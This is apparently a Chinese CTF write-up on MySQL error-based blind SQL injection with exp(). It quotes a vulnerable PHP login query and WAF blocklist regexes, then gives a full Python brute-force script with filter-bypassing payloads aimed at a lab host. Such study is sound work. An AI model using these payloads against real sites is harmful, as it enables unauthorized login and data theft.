## 使用exp函数进行报错注入

exp(x)：返回值为x的e（自然对数）次幂，大于等于710时会报错（mysql<5.5.53）

代码审计login()函数

```php
function login($username,$password,$code){
		$res = $this->conn->query("select * from users where username='$username' and password='$password'");
		if($this->conn->error){
			return 'error';
		}
		else{
			$content = $res->fetch_array();
			if($content['code']===$_POST['code']){
				$_SESSION['username'] = $content['username'];
				return 'success';
			}
			else{
				return 'fail';
			}
		}

	}
}

//保证code正确就能登录成功，获取flag
```



有两个waf：

一个是命令过滤（可以参照[sql注入](http://8.130.20.254/blog/11)）

另一个是控制数字不能连续超过九个，即字符串不能超过4个字符（因为过滤了引号需要用十六进制）

```
function sql_waf($str){
	if(preg_match('/union|select|or|and|\'|"|sleep|benchmark|regexp|repeat|get_lock|count|=|>|<| |\*|,|;|\r|\n|\t|substr|right|left|mid/i', $str)){
		die('Hack detected');
	}
}

function num_waf($str){
	if(preg_match('/\d{9}|0x[0-9a-f]{9}/i',$str)){
		die('Huge num detected');
	}
}
```



然后写脚本进行盲注,因为靶场原因可能会中断，所以要求从中间可以爆破

```python
import string

import requests
"select * from users where username='admin\\' and password='||1&&exp(999)#'"

all=string.ascii_letters+string.digits+'$'
#字母+数字

#字符串转16进制
def strr_r(str_s):
    s='0x'
    for i in str_s:
        s+=hex(ord(i)).replace('0x','')
    return s

#从左到右开始爆
def request_q():
    flag=1
    final=''
    s='^'#要是被中断了可以设置开始爆破点
    while flag==1:
        for i in all:
            url='http://eac1b710-0181-435b-8e7f-c61f6ab2ba5a.node4.buuoj.cn:81//login.php'
            data={
                "username":"admin\\",
                "password":f"||1 && exp(710-(code rlike binary {strr_r(s+i)}))#".replace(' ', chr(0x0b)),
                "code":"1"
            }
            req=requests.post(url=url,data=data,allow_redirects=False)
            if 'fail' in req.text:
                s+=i

                if(len(s)==4):
                    s=s[1:]
                print('当前payload是：',s)
                final+=i
                print('最终的payload是：',final)
                break
            if i =='$':
                flag=0

#从右到左开始爆
def request_p():
    flag=1
    final=''
    s='$'#要是被中断了可以设置开始爆破点,例：s='ghr'
    while flag==1:
        for i in all:
            url='http://eac1b710-0181-435b-8e7f-c61f6ab2ba5a.node4.buuoj.cn:81//login.php'
            data={
                "username":"admin\\",
                "password":f"||1 && exp(710-(code rlike binary {strr_r(i+s)}))#".replace(' ', chr(0x0b)),
                "code":"1"
            }
            req=requests.post(url=url,data=data,allow_redirects=False)
            if 'fail' in req.text:
                s=i+s

                if(len(s)==4):
                    s=s[:-1]
                print('当前payload是：', s)
                final = i+final
                print('最终的payload是：', final)
                break
            if i =='$':
                flag=0

#这里参照了师傅的从两头开始爆破
#因为只能从三个字符确定第四个字符，答案不一定正确，所以这里从两头开始爆破，然后在进行拼接
if __name__=='__main__':
    #request_q()
    #request_p()
    final_left='erghruigh2uygh2uygh'
    final_tight='erghruigh23uiu32ig'
    
    #最终将两边的合起来形成code
    url = 'http://eac1b710-0181-435b-8e7f-c61f6ab2ba5a.node4.buuoj.cn:81//login.php'
    data = {
        "username": "admin\\",
        "password": f"||1#".replace(' ', chr(0x0b)),
        "code": "erghruigh2uygh23uiu32ig"
    }
    req = requests.post(url=url, data=data, allow_redirects=False)
    print(req.text)
    req = requests.post(url=url, data=data, allow_redirects=True)
    print(req.text)
```





参考博客：[2021-虎符网络安全赛道-hatenum | exp()函数与正则过滤_迷途羔羊pro的博客-CSDN博客](https://blog.csdn.net/m0_55793759/article/details/127078074)